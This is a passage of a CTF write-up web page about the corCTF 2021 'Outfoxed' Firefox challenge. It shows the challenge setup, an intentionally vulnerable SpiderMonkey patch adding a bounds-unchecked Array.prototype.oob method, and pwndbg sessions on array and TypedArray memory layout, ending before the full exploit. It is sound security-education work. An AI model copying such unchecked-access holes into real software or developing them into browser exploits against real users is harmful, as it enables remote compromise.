<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Outfoxed | Organisers</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Outfoxed" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="CTF Team" />
<meta property="og:description" content="CTF Team" />
<link rel="canonical" href="https://org.anize.rs/corCTF-2021/pwn/outfoxed.html" />
<meta property="og:url" content="https://org.anize.rs/corCTF-2021/pwn/outfoxed.html" />
<meta property="og:site_name" content="Organisers" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Outfoxed" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Outfoxed","url":"https://org.anize.rs/corCTF-2021/pwn/outfoxed.html"}</script>
<!-- End Jekyll SEO tag -->


    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
    <meta name="twitter:card" content="summary" />
    <!-- TODO <meta name="twitter:description" content="" /> -->
    <meta name="twitter:title" content="Organisers" />
    <meta name="twitter:site" content="@0rganizers" />
    <!-- TODO <meta name="twitter:image" content="" /> -->

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#040d21">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Hack monospace font -->
    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">

    <!-- legitimize current Mastodon profile via link verification -->
    <link rel="me" href="https://infosec.exchange/@organizers" />


    <script type="text/javascript">
        function isLightThemeSelected() {
          return document.cookie.match(/theme=light/i) != null
        }

        function setThemeFromCookie() {
            var html = document.getElementsByTagName('html')[0]
            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
            console.log('Loaded cookie: ' + document.cookie)
        }

        (function() {
          setThemeFromCookie()
        })();
    </script>

    <script type="text/javascript">
        function getFootnoteContent(linkId) {
            const fnId = linkId.replace(/^fnref/, 'fn');
            return document.getElementById(fnId).querySelector("p").innerHTML;
        }

        function addFootnote(element, content) {
            const footnote = document.createElement('div');
            footnote.classList.add('footnote-box');
            // Also add the footnote number
            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
                footnote.removeChild(backlink);
            });
            element.insertAdjacentElement('afterend', footnote);
            element.dataset.toggled = '1';
        }

        function removeFootnote(element) {
            element.parentElement.removeChild(element.nextSibling);
            element.dataset.toggled = '0';
        }


        window.addEventListener("load", function() {
            document.querySelectorAll("a.footnote").forEach((el) => {
                const sup = el.parentElement;
                el.addEventListener("click", (event) => {
                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
                    if (!isOpen) {
                        addFootnote(sup, getFootnoteContent(sup.id));
                    } else {
                        removeFootnote(sup);
                    }
                    event.preventDefault();
                });
            });
        });
    </script>

    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      "HTML-CSS": {
        fonts: ["Gyre-Pagella"],
        imageFont: null,
        undefinedFamily: "'Arial Unicode MS', cmbright"
      },
      tex2jax: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        processEscapes: true
      }
    });
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
  </head>
  
  <body> 
    <header class="page-header-simple" role="banner">
      
      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
      <div class="right-links">
        <a href="/writeups">Writeups</a>
        <a href="/achievements">Achievements</a>
      </div>
    </header>

    <main id="content" class="main-content" role="main">
      <h1 id="outfoxed">Outfoxed</h1>

<p><strong>Authors:</strong> <a href="https://twitter.com/_MatteoRizzo">Nspace</a></p>

<p><strong>Tags:</strong> pwn, browser</p>

<p><strong>Points:</strong> 498</p>

<blockquote>
  <p>Just your average, easy browser pwn!</p>

  <p>https://outfoxed.be.ax</p>

  <p><a href="https://corctf2021-files.storage.googleapis.com/uploads/0df560b1a48641ae98116462c1a3d8ebd6605bcf236c4da5beba29f37da94961/outfoxed.tar.xz">outfoxed.tar.xz</a></p>
</blockquote>

<h2 id="analysis">Analysis</h2>

<p>In this challenge the authors visit a webpage of our choosing using a buggy
Firefox. Our job is to exploit the Firefox bug and use it to read the flag which
is stored on the challenge server.</p>

<p>Let’s start by checking out the attachments:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ tree outfoxed
outfoxed
├── app
│   ├── flag.txt
│   ├── fox.py
│   └── reader
├── code
│   ├── log
│   ├── mozconfig
│   ├── patch
│   └── README.md
├── docker-compose.yml
└── Dockerfile
</code></pre></div></div>

<p>The challenge runs in a container built from the following Dockerfile:</p>

<div class="language-dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> python:slim</span>
<span class="k">RUN </span>apt-get update <span class="se">\
</span>	<span class="o">&amp;&amp;</span> apt-get <span class="nb">install</span> <span class="nt">-y</span> socat curl <span class="nb">gzip</span> <span class="se">\
</span>	<span class="o">&amp;&amp;</span> apt-get <span class="nb">install</span> <span class="nt">-y</span> <span class="nt">--no-install-recommends</span> <span class="se">\
</span>	libglib2.0-0 libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 <span class="se">\
</span>	libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libgtk-3-0 <span class="se">\
</span>	libasound2 libxshmfence1 libx11-xcb1 libdbus-glib-1-2 libxtst6 libxt6 <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /var/lib/apt/lists/<span class="k">*</span>

<span class="k">COPY</span><span class="s"> app/flag.txt /flag.txt</span>
<span class="k">COPY</span><span class="s"> app/reader /reader</span>
<span class="k">RUN </span><span class="nb">chmod </span>0640 /flag.txt <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>6755 /reader

<span class="k">RUN </span>useradd <span class="nt">-ms</span> /bin/bash ctf

<span class="k">WORKDIR</span><span class="s"> /app</span>
<span class="k">RUN </span>curl <span class="nt">-fsS</span> https://files.be.ax/outfoxed-7d11ebc85cf45e851977eda017da26ad71b225ecf28e3f2973fc1cbd09dd3286/outfoxed.tar.gz | <span class="nb">tar </span>x
<span class="k">COPY</span><span class="s"> app/fox.py /app/flag.py</span>

<span class="k">USER</span><span class="s"> ctf</span>
<span class="k">CMD</span><span class="s">  ["socat", "tcp-l:1337,reuseaddr,fork", "EXEC:/app/flag.py"]</span>
</code></pre></div></div>

<p><strong>OBJECTIVE</strong>: read <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>

<p>Firefox runs as the user <code class="language-plaintext highlighter-rouge">ctf</code>, but only root can read the flag. The only way to
get it is to execute the <code class="language-plaintext highlighter-rouge">reader</code> program which prints the flag and is setuid
root. This setup means that reading arbitrary files is not enough, and instead
we need to get code execution in the container.</p>

<p><strong>NEW OBJECTIVE</strong>: execute <code class="language-plaintext highlighter-rouge">/reader</code> and read its output.</p>

<p><code class="language-plaintext highlighter-rouge">fox.py</code> reads a webpage from us and opens it in Firefox:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">tempfile</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Enter exploit followed by EOF: "</span><span class="p">)</span>
<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>

<span class="n">buf</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">while</span> <span class="s">"EOF"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="nb">input</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>

<span class="k">with</span> <span class="n">tempfile</span><span class="p">.</span><span class="n">TemporaryDirectory</span><span class="p">()</span> <span class="k">as</span> <span class="nb">dir</span><span class="p">:</span>
    <span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="nb">dir</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit.html"</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"&lt;script src='exploit.js'&gt;&lt;/script&gt;"</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit.js"</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">])</span>
    <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">"MOZ_DISABLE_CONTENT_SANDBOX"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"1"</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">"timeout 20s /app/firefox/firefox --headless exploit.html"</span><span class="p">)</span>
</code></pre></div></div>

<p>The script sets the <code class="language-plaintext highlighter-rouge">MOZ_DISABLE_CONTENT_SANDBOX</code> environment variable which
disables Firefox’s sandbox. Modern web browsers employ
a multi-process architecture to defend against vulnerabilities: the <em>browser process</em>
is privileged and has access to everything, whereas the <em>renderer processes</em> are
heavily sandboxed and can do almost nothing without going through the browser
process. The code that is most vulnerable to attacks (e.g., because it handles
untrusted data) runs in the renderer process so that even if an attacker manages
to exploit it, they still cannot take over the machine. If you’re interested in 
learning more, LiveOverflow has a <a href="https://www.youtube.com/watch?v=StQ_6juJlZY">video</a>
that talks about browser sandboxing. Here the sandbox is
disabled, so a compromised renderer process is free to read/write files and execute other
programs. This means that taking over the renderer process is enough to solve
the challenge, as we can then execute <code class="language-plaintext highlighter-rouge">/reader</code> and get the flag.</p>

<p><strong>NEW OBJECTIVE</strong>: compromise Firefox’s renderer process.</p>

<h3 id="patch">Patch</h3>

<p>Browser challenges don’t usually ask the players to exploit a real-world bug
(although there are
<a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/">exceptions</a> of course).
Instead, the author typically introduces their own bug into the browser, and
players have to exploit that. This challenge is no different, and it includes
the author’s Firefox patch. Let’s have a look at that:</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/js/src/builtin/Array.cpp b/js/src/builtin/Array.cpp
</span><span class="gd">--- a/js/src/builtin/Array.cpp
</span><span class="gi">+++ b/js/src/builtin/Array.cpp
</span><span class="p">@@ -428,6 +428,29 @@</span> static inline bool GetArrayElement(JSCon
   return GetProperty(cx, obj, obj, id, vp);
 }
 
<span class="gi">+static inline bool GetTotallySafeArrayElement(JSContext* cx, HandleObject obj,
+                                   uint64_t index, MutableHandleValue vp) {
+  if (obj-&gt;is&lt;NativeObject&gt;()) {
+    NativeObject* nobj = &amp;obj-&gt;as&lt;NativeObject&gt;();
+    vp.set(nobj-&gt;getDenseElement(size_t(index)));
+    if (!vp.isMagic(JS_ELEMENTS_HOLE)) {
+      return true;
+    }
+
+    if (nobj-&gt;is&lt;ArgumentsObject&gt;() &amp;&amp; index &lt;= UINT32_MAX) {
+      if (nobj-&gt;as&lt;ArgumentsObject&gt;().maybeGetElement(uint32_t(index), vp)) {
+        return true;
+      }
+    }
+  }
+
+  RootedId id(cx);
+  if (!ToId(cx, index, &amp;id)) {
+    return false;
+  }
+  return GetProperty(cx, obj, obj, id, vp);
+}
+
</span> static inline bool DefineArrayElement(JSContext* cx, HandleObject obj,
                                       uint64_t index, HandleValue value) {
   RootedId id(cx);
<span class="p">@@ -2624,6 +2647,7 @@</span> enum class ArrayAccess { Read, Write };
 template &lt;ArrayAccess Access&gt;
 static bool CanOptimizeForDenseStorage(HandleObject arr, uint64_t endIndex) {
   /* If the desired properties overflow dense storage, we can't optimize. */
<span class="gi">+
</span>   if (endIndex &gt; UINT32_MAX) {
     return false;
   }
<span class="p">@@ -3342,6 +3366,34 @@</span> static bool ArraySliceOrdinary(JSContext
   return true;
 }
 
<span class="gi">+
+bool js::array_oob(JSContext* cx, unsigned argc, Value* vp) {
+  CallArgs args = CallArgsFromVp(argc, vp);
+  RootedObject obj(cx, ToObject(cx, args.thisv()));
+  double index;
+  if (args.length() == 1) {
+    if (!ToInteger(cx, args[0], &amp;index)) {
+      return false;
+    }
+    GetTotallySafeArrayElement(cx, obj, index, args.rval());
+  } else if (args.length() == 2) {
+    if (!ToInteger(cx, args[0], &amp;index)) {
+      return false;
+    }
+    NativeObject* nobj =
+        obj-&gt;is&lt;NativeObject&gt;() ? &amp;obj-&gt;as&lt;NativeObject&gt;() : nullptr;
+    if (nobj) {
+      nobj-&gt;setDenseElement(index, args[1]);
+    } else {
+      puts("Not dense");
+    }
+    GetTotallySafeArrayElement(cx, obj, index, args.rval());
+  } else {
+    return false;
+  }
+  return true;
+}
+
</span> /* ES 2016 draft Mar 25, 2016 22.1.3.23. */
 bool js::array_slice(JSContext* cx, unsigned argc, Value* vp) {
   AutoGeckoProfilerEntry pseudoFrame(
<span class="p">@@ -3569,6 +3621,7 @@</span> static const JSJitInfo array_splice_info
 };
 
 static const JSFunctionSpec array_methods[] = {
<span class="gi">+    JS_FN("oob", array_oob, 2, 0),
</span>     JS_FN(js_toSource_str, array_toSource, 0, 0),
     JS_SELF_HOSTED_FN(js_toString_str, "ArrayToString", 0, 0),
     JS_FN(js_toLocaleString_str, array_toLocaleString, 0, 0),
<span class="gh">diff --git a/js/src/builtin/Array.h b/js/src/builtin/Array.h
</span><span class="gd">--- a/js/src/builtin/Array.h
</span><span class="gi">+++ b/js/src/builtin/Array.h
</span><span class="p">@@ -113,6 +113,8 @@</span> extern bool array_shift(JSContext* cx, u
 
 extern bool array_slice(JSContext* cx, unsigned argc, js::Value* vp);
 
<span class="gi">+extern bool array_oob(JSContext* cx, unsigned argc, Value* vp);
+
</span> extern JSObject* ArraySliceDense(JSContext* cx, HandleObject obj, int32_t begin,
                                  int32_t end, HandleObject result);

</code></pre></div></div>

<p>The patch looks a bit complicated, but in reality it only adds a new <code class="language-plaintext highlighter-rouge">oob</code>
method to JavaScript arrays. <code class="language-plaintext highlighter-rouge">Array.prototype.oob</code> lets us read and write an
element of the array. For example:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">];</span>

<span class="c1">// Read an element of the array</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
<span class="c1">// prints 1</span>

<span class="c1">// Write an element of the array</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1234</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
<span class="c1">// prints 1, 1234</span>
</code></pre></div></div>

<p>The catch is that <code class="language-plaintext highlighter-rouge">oob</code> doesn’t perform any bounds checking, so it lets us read
and write out of bounds:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">1000</span><span class="p">));</span>
<span class="c1">// prints 5e-324</span>
</code></pre></div></div>

<p>Bugs like this are generally pretty straightforward to turn into code execution.
So with that in mind, let’s get started!</p>

<h2 id="setup">Setup</h2>

<p>Debugging a browser is usually a bit complicated because of the multi-process
setup. Fortunately, it’s usually possible to build a JavaScript shell that only
includes the JavaScript runtime and that we can debug easily with GDB. Firefox
is no exception here. I built Firefox’s JavaScript shell by following
<a href="https://firefox-source-docs.mozilla.org/js/build.html">Mozilla’s documentation</a>.
Make sure to use the same version as the author (<code class="language-plaintext highlighter-rouge">655554:f4922b9e9a6b</code>) and to
apply the patch before compiling. While building in debug mode is generally
a good idea when debugging, accessing arrays out of bounds with <code class="language-plaintext highlighter-rouge">oob</code> causes
an assertion failure which crashes the shell so I used a release build to
develop the exploit. We can debug the resulting <code class="language-plaintext highlighter-rouge">js</code> binary easily in GDB.</p>

<p>I will be using <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>, a GDB plugin that
adds a lot of nice features, throughout the writeup.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from dist/bin/js...
pwndbg&gt; b js::math_atan2
Breakpoint 1 at 0x134b162: file /home/matteo/Documents/gecko-dev/js/src/jsmath.cpp, line 162.
pwndbg&gt; r
js&gt; Math.atan2(2)

Thread 1 "js" hit Breakpoint 1, js::math_atan2 (cx=cx@entry=0x7ffff6518000, argc=1, vp=0x7ffff5343098) at js/src/jsmath.cpp:162
162	  CallArgs args = CallArgsFromVp(argc, vp);
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────
 RAX  0x1
 RBX  0x7ffff53c1800 —▸ 0x7ffff6563080 —▸ 0x7ffff53ac000 —▸ 0x7ffff653b000 —▸ 0x7ffff5343000 ◂— ...
 RCX  0x4be574f94dddc200
 RDX  0x7ffff5343098 ◂— 0xfffe3eb45a763158
 RDI  0x7ffff6518000 ◂— 0x0
 RSI  0x1
 R8   0x1a
 R9   0x7fffffffc648 —▸ 0x3eb45a761360 ◂— 0x500000258
 R10  0x7ffff52c6c00 ◂— 0x0
 R11  0x7fffffffc598 —▸ 0x7fffffffc638 ◂— 0x0
 R12  0x55555689f140 ◂— push   rbp
 R13  0x7fffffffc750 —▸ 0x7ffff53430a8 ◂— 0xfff8800000000002
 R14  0x7ffff6518000 ◂— 0x0
 R15  0x7ffff5343098 ◂— 0xfffe3eb45a763158
 RBP  0x7fffffffc5e0 —▸ 0x7fffffffc680 —▸ 0x7fffffffca60 —▸ 0x7fffffffcab0 —▸ 0x7fffffffcb20 ◂— ...
 RSP  0x7fffffffc5b0 —▸ 0x3eb45a73d030 —▸ 0x3eb45a7644a0 —▸ 0x3eb45a73b0b8 —▸ 0x55555764cf20 (global_class) ◂— ...
 RIP  0x55555689f162 ◂— mov    rcx, qword ptr [rdx + 8]
──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0x55555689f162    mov    rcx, qword ptr [rdx + 8]
   0x55555689f166    mov    rdx, rcx
   0x55555689f169    shr    rdx, 0x2f
   0x55555689f16d    cmp    edx, 0x1fff5
   0x55555689f173    jne    0x55555689f17e                &lt;0x55555689f17e&gt;
    ↓
   0x55555689f17e    test   eax, eax
   0x55555689f180    je     0x55555689f197                &lt;0x55555689f197&gt;
 
   0x55555689f182    lea    rsi, [r15 + 0x10]
   0x55555689f186    cmp    eax, 1
   0x55555689f189    jne    0x55555689f1a6                &lt;0x55555689f1a6&gt;
 
   0x55555689f18b    lea    rax, [rip + 0xdc61de]         &lt;0x555557665370&gt;
──────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────────────────
In file: js/src/jsmath.cpp
   157   res.setDouble(z);
   158   return true;
   159 }
   160 
   161 bool js::math_atan2(JSContext* cx, unsigned argc, Value* vp) {
 ► 162   CallArgs args = CallArgsFromVp(argc, vp);
   163 
   164   return math_atan2_handle(cx, args.get(0), args.get(1), args.rval());
   165 }
   166 
   167 double js::math_ceil_impl(double x) {
──────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffc5b0 —▸ 0x3eb45a73d030 —▸ 0x3eb45a7644a0 —▸ 0x3eb45a73b0b8 —▸ 0x55555764cf20 (global_class) ◂— ...
01:0008│     0x7fffffffc5b8 —▸ 0x7ffff6518060 —▸ 0x7fffffffc7a8 ◂— 0x7ffff6518060
02:0010│     0x7fffffffc5c0 ◂— 0x4be574f94dddc200
03:0018│     0x7fffffffc5c8 —▸ 0x7ffff53c1800 —▸ 0x7ffff6563080 —▸ 0x7ffff53ac000 —▸ 0x7ffff653b000 ◂— ...
04:0020│     0x7fffffffc5d0 —▸ 0x7ffff6518000 ◂— 0x0
05:0028│     0x7fffffffc5d8 —▸ 0x7fffffffc618 —▸ 0x7ffff6518000 ◂— 0x0
06:0030│ rbp 0x7fffffffc5e0 —▸ 0x7fffffffc680 —▸ 0x7fffffffca60 —▸ 0x7fffffffcab0 —▸ 0x7fffffffcb20 ◂— ...
07:0038│     0x7fffffffc5e8 —▸ 0x5555568b2252 ◂— mov    r15d, eax
────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0   0x55555689f162
   f 1   0x5555568b2252
   f 2   0x5555568b2252
   f 3   0x5555568ac3ff
   f 4   0x5555568ac3ff
   f 5   0x5555568ac3ff
   f 6   0x5555568a40a8
   f 7   0x5555568b388e
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; 
</code></pre></div></div>

<h2 id="spidermonkey-internals">SpiderMonkey Internals</h2>

<p>While I have solved numerous browser challenges based on Chromium, I had never
looked at SpiderMonkey (Firefox’s JavaScript engine) before. However JavaScript
engines all work in a similar way and my experience with V8 (Chromium’s
JavaScript engine) was really helpful in quickly making sense of SpiderMonkey’s
internals. I also relied heavily on
<a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/">this blog post by 0vercl0k</a>
to understand SpiderMonkey and get ideas on how to proceed in my exploit.
I encourage you to go and read it
if you’re not already familiar with this engine, but I’ll summarize the more
important parts here. As far as I can tell some of the data structures have
changed since that blog post was written, so the information in there is not
entirely up to date. The important parts have stayed the same though.</p>

<h3 id="js-arrays">JS Arrays</h3>

<p><code class="language-plaintext highlighter-rouge">Array.prototype.oob</code> lets us read and write out of bounds of a JavaScript array,
so it’s important that we first understand how SpiderMonkey stores JavaScript arrays in memory.
A JavaScript array is stored as a <a href="https://searchfox.org/mozilla-central/rev/4cca5d2f257c6f1bcef50a0debcbd66524add703/js/src/vm/NativeObject.h#525">js::NativeObject</a>. We can
print its memory layout using GDB:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; ptype /o js::NativeObject
/* offset    |  size */  type = class js::NativeObject : public JSObject {
                         protected:
/*    8      |     8 */    js::HeapSlot *slots_;
/*   16      |     8 */    js::HeapSlot *elements_;
                           /* total size (bytes):   24 */
                        }
</code></pre></div></div>

<p>The first 8 bytes contain a pointer to a <code class="language-plaintext highlighter-rouge">js::Shape</code>, which essentially describes
the memory layout of the object and is used, among other things, by the GC when
it needs to figure out what memory to collect. <code class="language-plaintext highlighter-rouge">slots_</code> and <code class="language-plaintext highlighter-rouge">elements_</code> point
to the memory that contains the array’s properties, and elements respectively.
We can see this when printing the contents of memory in GDB.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>js&gt; let a = [1, 2, 3, 4]

pwndbg&gt; tele 0x0e704873d0e0
00:0000│  0xe704873d0e0 —▸ 0xe7048760e20 —▸ 0xe704873b208 —▸ 0x555557650e10 (js::ArrayObject::class_) —▸ 0x55555574c0be ◂— ...
01:0008│  0xe704873d0e8 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│  0xe704873d0f0 —▸ 0xe704873d108 ◂— 0xfff8800000000001
03:0018│  0xe704873d0f8 ◂— 0x400000000
04:0020│  0xe704873d100 ◂— 0x400000006
05:0028│  0xe704873d108 ◂— 0xfff8800000000001
06:0030│  0xe704873d110 ◂— 0xfff8800000000002
07:0038│  0xe704873d118 ◂— 0xfff8800000000003
08:0040│  0xe704873d120 ◂— 0xfff8800000000004
09:0048│  0xe704873d128 ◂— 0x0
... ↓
</code></pre></div></div>

<p>As we can see, <code class="language-plaintext highlighter-rouge">elements_</code> points to <code class="language-plaintext highlighter-rouge">0xe704873d108</code>, which contains the 4
elements of our array. Since a JavaScript array can contain any type of object,
and not just integers, the engine uses <em>NaN tagging</em> to distinguish between
different types. Floats are stored as-is, and other types such as integers and
pointers contain a tag in the upper 17 bits that identifies their type. This is
called <em>NaN tagging</em> because these tagged values correspond to special Not-a-Number
values when interpreted as a floating point number. Here, 0xfff88 is the tag for
integers, and we can indeed see that our 4 array elements are tagged in this way.</p>

<p>We can verify this by printing the contents of an array that contains other types
of objects:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>js&gt; let a = [1, 2, 13.37, []]

pwndbg&gt; tele 0x10d983000698
00:0000│  0x10d983000698 —▸ 0x12997c760e20 —▸ 0x12997c73b208 —▸ 0x555557650e10 (js::ArrayObject::class_) —▸ 0x55555574c0be ◂— ...
01:0008│  0x10d9830006a0 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│  0x10d9830006a8 —▸ 0x10d9830006c0 ◂— 0xfff8800000000001
03:0018│  0x10d9830006b0 ◂— 0x400000000
04:0020│  0x10d9830006b8 ◂— 0x400000006
05:0028│  0x10d9830006c0 ◂— 0xfff8800000000001
06:0030│  0x10d9830006c8 ◂— 0xfff8800000000002
07:0038│  0x10d9830006d0 ◂— 0x402abd70a3d70a3d
08:0040│  0x10d9830006d8 ◂— 0xfffe10d9830006f8
09:0048│  0x10d9830006e0 ◂— 0x0
0a:0050│  0x10d9830006e8 ◂— 0x0

pwndbg&gt; p *(double*)0x10d9830006d0
$2 = 13.369999999999999
</code></pre></div></div>

<p>As we expected, 1 and 2 are tagged with 0xfff88, the float is stored untagged,
and the pointer to the array is tagged with 0xfffe. The other two qwords between
<code class="language-plaintext highlighter-rouge">elements_</code> and the elements storage is a <code class="language-plaintext highlighter-rouge">js::ObjectElements</code> object that
describes the length and capacity of the array:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; ptype /o js::ObjectElements
/* offset    |  size */  type = class js::ObjectElements {
                         private:
/*    0      |     4 */    uint32_t flags;
/*    4      |     4 */    uint32_t initializedLength;
/*    8      |     4 */    uint32_t capacity;
/*   12      |     4 */    uint32_t length;
                           /* total size (bytes):   16 */
                         }

pwndbg&gt; p *(js::ObjectElements*)0x10d9830006b0
$3 = {
  flags = 0,
  initializedLength = 4,
  capacity = 6,
  length = 4,
}
</code></pre></div></div>

<p>A typical technique used in exploiting JavaScript engines is to overwrite the
elements pointer of an array, then read or write to the array to gain arbitrary
memory read and write. While this works, it would be annoying to do so in our
exploit because we would need to tag/untag values all the time and we wouldn’t
be able to write values that don’t correspond to a valid float or tagged value.
Fortunately the JavaScript spec gives us another data structure that is much
more convenient for this.</p>

<h3 id="js-typedarrays">JS TypedArrays</h3>

<p>In contrast to regular JavaScript arrays, a TypedArray can only contain integers
of a fixed size. For example a Uint32Array can only contain unsigned 32-bit integers.
The elements of a TypedArray are always stored untagged, just like in a C array.
This avoids the problems I described in the previous section and makes TypedArrays
a popular corruption target in JavaScript engine exploits. SpiderMonkey represents
TypedArrays as a <a href="https://searchfox.org/mozilla-central/rev/4cca5d2f257c6f1bcef50a0debcbd66524add703/js/src/vm/ArrayBufferViewObject.h#25">js::ArrayBufferViewObject</a>:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">ArrayBufferViewObject</span> <span class="o">:</span> <span class="k">public</span> <span class="n">NativeObject</span> <span class="p">{</span>
 <span class="nl">public:</span>
  <span class="c1">// Underlying (Shared)ArrayBufferObject.</span>
  <span class="k">static</span> <span class="k">constexpr</span> <span class="kt">size_t</span> <span class="n">BUFFER_SLOT</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="c1">// Slot containing length of the view in number of typed elements.</span>
  <span class="k">static</span> <span class="k">constexpr</span> <span class="kt">size_t</span> <span class="n">LENGTH_SLOT</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

  <span class="c1">// Offset of view within underlying (Shared)ArrayBufferObject.</span>
  <span class="k">static</span> <span class="k">constexpr</span> <span class="kt">size_t</span> <span class="n">BYTEOFFSET_SLOT</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>

  <span class="c1">// Pointer to raw buffer memory.</span>
  <span class="k">static</span> <span class="k">constexpr</span> <span class="kt">size_t</span> <span class="n">DATA_SLOT</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>

  <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div></div>

